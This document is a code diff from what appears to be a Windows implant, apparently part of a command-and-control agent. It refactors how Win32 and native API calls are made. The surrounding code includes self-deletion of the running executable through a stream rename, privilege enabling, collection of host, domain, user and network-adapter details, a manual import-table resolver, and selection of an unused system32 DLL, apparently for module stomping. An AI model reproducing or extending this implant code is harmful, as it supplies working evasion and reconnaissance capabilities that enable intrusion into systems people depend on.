@@ -14,13 +14,13 @@ FUNC BOOL CreateImplantBackup(
     HANDLE        hSection    = NULL;
     ULONG         Status      = STATUS_SUCCESS;
 
-    Status = Instance()->Win32.NtCreateSection( 
+    Status = Win32().NtCreateSection( 
         &hSection, SECTION_ALL_ACCESS, NULL, 
         &MaximumSize, PAGE_READWRITE, SEC_COMMIT, NULL 
     ); 
     if ( Status != 0 ) return FALSE;
 
-    Status = Instance()->Win32.NtMapViewOfSection( 
+    Status = Win32().NtMapViewOfSection( 
         hSection, NtCurrentProcess(), &Instance()->Blackout.Stomp.Backup, 
         0, 0, 0, &Instance()->Blackout.Region.Length, ViewShare, 0, PAGE_READWRITE 
     );
@@ -112,13 +112,13 @@ FUNC VOID GetTokenUserA(
     PVOID        UserStr    = NULL;
     PVOID        DomainStr  = NULL;
 
-    Instance()->Win32.NtQueryInformationToken( TokenHandle, TokenUser, NULL, NULL, &RetLen );
+    Win32().NtQueryInformationToken( TokenHandle, TokenUser, NULL, NULL, &RetLen );
 
     pTokenUser = bkHeapAlloc( RetLen );
 
-    bkErrorCode = Instance()->Win32.NtQueryInformationToken( TokenHandle, TokenUser, pTokenUser, RetLen, &RetLen );
+    bkErrorCode = Win32().NtQueryInformationToken( TokenHandle, TokenUser, pTokenUser, RetLen, &RetLen );
 
-   if ( !Instance()->Win32.LookupAccountSidA( NULL, pTokenUser->User.Sid, NULL, &UserLen, NULL, &DomainLen, &SidName ) ) {
+   if ( !Win32().LookupAccountSidA( NULL, pTokenUser->User.Sid, NULL, &UserLen, NULL, &DomainLen, &SidName ) ) {
         TotalLen = ( UserLen * sizeof( CHAR ) ) + ( DomainLen * sizeof( CHAR ) ) + sizeof( CHAR );
 
         *UserName = bkHeapAlloc( TotalLen );
@@ -129,7 +129,7 @@ FUNC VOID GetTokenUserA(
 
         SidName = 0;
 
-        if ( !Instance()->Win32.LookupAccountSidA( NULL, pTokenUser->User.Sid, UserStr, &UserLen, DomainStr, &DomainLen, &SidName ) ) {
+        if ( !Win32().LookupAccountSidA( NULL, pTokenUser->User.Sid, UserStr, &UserLen, DomainStr, &DomainLen, &SidName ) ) {
             bkErrorCode = NtLastError();
             goto _Leave;
         }
@@ -188,14 +188,14 @@ BOOL SetPrivilege(
     LUID			 Luid       = { 0x00 };
     BOOL             bCheck     = FALSE;
 
-    bCheck = Instance()->Win32.LookupPrivilegeValueA( NULL, PrivilegeName, &Luid );
+    bCheck = Win32().LookupPrivilegeValueA( NULL, PrivilegeName, &Luid );
     if ( !bCheck ) return FALSE;
     
     TokenPrivs.PrivilegeCount           = 0x01;	// Adjusting one privilege (one element of the 'Privileges' structure array)
     TokenPrivs.Privileges[0].Luid       = Luid;
     TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    bCheck = Instance()->Win32.AdjustTokenPrivileges(
+    bCheck = Win32().AdjustTokenPrivileges(
         hToken, FALSE, &TokenPrivs, 
         sizeof( TOKEN_PRIVILEGES ), NULL, NULL
     );
@@ -231,28 +231,28 @@ FUNC BOOL SelfDeletion(
     Rename->FileNameLength = StreamLen;
     MmCopy( Rename->FileName, NewStream, StreamLen );
 
-    hFile = Instance()->Win32.CreateFileW( 
+    hFile = Win32().CreateFileW( 
         Instance()->Session.ProcessFullPath, 
         DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, 
         OPEN_EXISTING, NULL, NULL
     );
     if ( hFile == INVALID_HANDLE_VALUE ) return FALSE;
 
-    bCheck = Instance()->Win32.SetFileInformationByHandle( 
+    bCheck = Win32().SetFileInformationByHandle( 
         hFile, FileRenameInfo, Rename, RenameLen 
     );
     if ( !bCheck ) return;
 
     bkHandleClose( hFile );
 
-    hFile = Instance()->Win32.CreateFileW( 
+    hFile = Win32().CreateFileW( 
         Instance()->Session.ProcessFullPath, 
         DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
         NULL, OPEN_EXISTING, NULL, NULL 
     );
     if ( hFile == INVALID_HANDLE_VALUE ) return FALSE;
 
-    bCheck = Instance()->Win32.SetFileInformationByHandle( 
+    bCheck = Win32().SetFileInformationByHandle( 
         hFile, FileDispositionInfo, &Delete, sizeof( Delete ) 
     );
     if ( !bCheck ) return FALSE;
@@ -313,9 +313,9 @@ FUNC VOID GetComputerInfo(
 
     SYSTEM_INFO SysInf = { 0 };
 
-    Instance()->Win32.GetNativeSystemInfo( &SysInf );
+    Win32().GetNativeSystemInfo( &SysInf );
 
-    bCheck = Instance()->Win32.GetProductInfo( 
+    bCheck = Win32().GetProductInfo( 
         Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion, 
         Instance()->Teb->ProcessEnvironmentBlock->OSMinorVersion, 
         Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMajorVersion,
@@ -325,33 +325,33 @@ FUNC VOID GetComputerInfo(
     if( !bCheck )
         PackageTransmitError( NtLastError() );
 
-    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &CompTmpLen ) ) {
+    if ( !Win32().GetComputerNameExA( ComputerNameDnsHostname, NULL, &CompTmpLen ) ) {
         Instance()->System.ComputerName = bkHeapAlloc( CompTmpLen );
-        Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, Instance()->System.ComputerName, &CompTmpLen );
+        Win32().GetComputerNameExA( ComputerNameDnsHostname, Instance()->System.ComputerName, &CompTmpLen );
     }
 
-    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &DomainLen ) ) {
+    if ( !Win32().GetComputerNameExA( ComputerNameDnsDomain, NULL, &DomainLen ) ) {
         Instance()->System.DomainName = bkHeapAlloc( DomainLen );
-        Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, Instance()->System.DomainName, &DomainLen );
+        Win32().GetComputerNameExA( ComputerNameDnsDomain, Instance()->System.DomainName, &DomainLen );
     }
 
-    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &NetBiosLen ) ) {
+    if ( !Win32().GetComputerNameExA( ComputerNameNetBIOS, NULL, &NetBiosLen ) ) {
         Instance()->System.NetBios = bkHeapAlloc( NetBiosLen );
-        Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, Instance()->System.NetBios, &NetBiosLen );
+        Win32().GetComputerNameExA( ComputerNameNetBIOS, Instance()->System.NetBios, &NetBiosLen );
     }
 
     ULONG AdapterInfoSize = 0;
     PIP_ADAPTER_INFO Adapters = NULL;
 
-    if ( Instance()->Win32.GetAdaptersInfo( NULL, &AdapterInfoSize ) == ERROR_BUFFER_OVERFLOW ) {
+    if ( Win32().GetAdaptersInfo( NULL, &AdapterInfoSize ) == ERROR_BUFFER_OVERFLOW ) {
         Adapters = bkHeapAlloc( AdapterInfoSize );
         if ( Adapters ) {
-            Instance()->Win32.GetAdaptersInfo( Adapters, &AdapterInfoSize );
+            Win32().GetAdaptersInfo( Adapters, &AdapterInfoSize );
         }
     }
 
     Instance()->System.UserName = bkHeapAlloc( UserTmpLen );
-    Instance()->Win32.GetUserNameA( Instance()->System.UserName, &UserTmpLen );
+    Win32().GetUserNameA( Instance()->System.UserName, &UserTmpLen );
 
     *ProcessArch  = SysInf.wProcessorArchitecture;
     *ProcessType  = SysInf.dwProcessorType;
@@ -393,7 +393,7 @@ FUNC VOID GetProcessInfo(
 
     MmZero( &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ) );
 
-    Instance()->Win32.NtQueryInformationProcess( NtCurrentProcess(), ProcessBasicInformation, &Ebi, sizeof( Ebi ), NULL );
+    Win32().NtQueryInformationProcess( NtCurrentProcess(), ProcessBasicInformation, &Ebi, sizeof( Ebi ), NULL );
     *Protected    = Ebi.IsProtectedProcess;
     *ParentProcId = HandleToULong( Ebi.BasicInfo.InheritedFromUniqueProcessId );
 
@@ -581,7 +581,7 @@ FUNC PVOID LdrLoadLib(
 
     InitUnicodeString( &uStrMod, Module );
 
-    Status = Instance()->Win32.LdrLoadDll( NULL, 0, &uStrMod, &hModule );
+    Status = Win32().LdrLoadDll( NULL, 0, &uStrMod, &hModule );
     if ( Status != 0 ) return NULL;
 
     return hModule;
@@ -604,11 +604,11 @@ FUNC BOOL GetRandomDllName(
     WIN32_FIND_DATAA      FindData  = { 0 };
     CHAR                  DllDirs[MAX_PATH] = "c:\\windows\\system32\\*.dll"; //todo: encrypt this
     
-    hFind = Instance()->Win32.FindFirstFileA( DllDirs, &FindData );
+    hFind = Win32().FindFirstFileA( DllDirs, &FindData );
 
     do {
         if ( ic == Index ) {
-           if ( Instance()->Win32.GetModuleHandleA( FindData.cFileName ) == NULL ) {
+           if ( Win32().GetModuleHandleA( FindData.cFileName ) == NULL ) {
                 StringConcatA( FilePath, "C:\\Windows\\System32\\" );
                 StringConcatA( FilePath, FindData.cFileName );
                 break;
@@ -618,13 +618,13 @@ FUNC BOOL GetRandomDllName(
 
         ic++;
         
-    } while( Instance()->Win32.FindNextFileA( hFind, &FindData ) );
+    } while( Win32().FindNextFileA( hFind, &FindData ) );
 
     MmCopy( ModuleName, FilePath, MAX_PATH );
 
 _Leave:
     if ( FilePath    ) MmZero( FilePath, MAX_PATH );
-    if ( hFind       ) Instance()->Win32.FindClose( hFind );
+    if ( hFind       ) Win32().FindClose( hFind );
 
     return TRUE;
 }
@@ -646,10 +646,10 @@ FUNC BOOL ResolveIat(
         PIMAGE_THUNK_DATA Ilt = (PIMAGE_THUNK_DATA)( B_PTR( BaseAddress + ImportDescriptor->OriginalFirstThunk ) );
 
         ModuleName = B_PTR( BaseAddress + ImportDescriptor->Name );
-        ModuleAddr = Instance()->Win32.GetModuleHandleA( ModuleName );
+        ModuleAddr = Win32().GetModuleHandleA( ModuleName );
         BK_PRINT( "Module loaded %s @ 0x%p\n", ModuleName, ModuleAddr );
         if ( !ModuleAddr ) {
-            ModuleAddr = Instance()->Win32.LoadLibraryA( ModuleName );
+            ModuleAddr = Win32().LoadLibraryA( ModuleName );
             BK_PRINT( "Module loaded %s @ 0x%p\n", ModuleName, ModuleAddr );
             if ( !ModuleAddr ) {
                 return FALSE;
@@ -659,11 +659,11 @@ FUNC BOOL ResolveIat(
         for ( ; Ilt->u1.Function; Iat++, Ilt++ ) {
             if ( IMAGE_SNAP_BY_ORDINAL( Ilt->u1.Ordinal ) ) {
                 OrdFunction      = A_PTR( IMAGE_ORDINAL( Ilt->u1.Ordinal ) );
-                Iat->u1.Function = U_PTR( Instance()->Win32.GetProcAddress( ModuleAddr, OrdFunction ) );
+                Iat->u1.Function = U_PTR( Win32().GetProcAddress( ModuleAddr, OrdFunction ) );
                 BK_PRINT( "Function loaded %d @ 0x%p\n", Ilt->u1.Ordinal, Iat->u1.Function );
             } else {
                 Hint             = U_PTR( BaseAddress + Ilt->u1.AddressOfData );
-                Iat->u1.Function = U_PTR( Instance()->Win32.GetProcAddress( ModuleAddr, Hint->Name ) );
+                Iat->u1.Function = U_PTR( Win32().GetProcAddress( ModuleAddr, Hint->Name ) );
                 BK_PRINT( "Function loaded %s @ 0x%p\n", Hint->Name, Iat->u1.Function );
             }
 
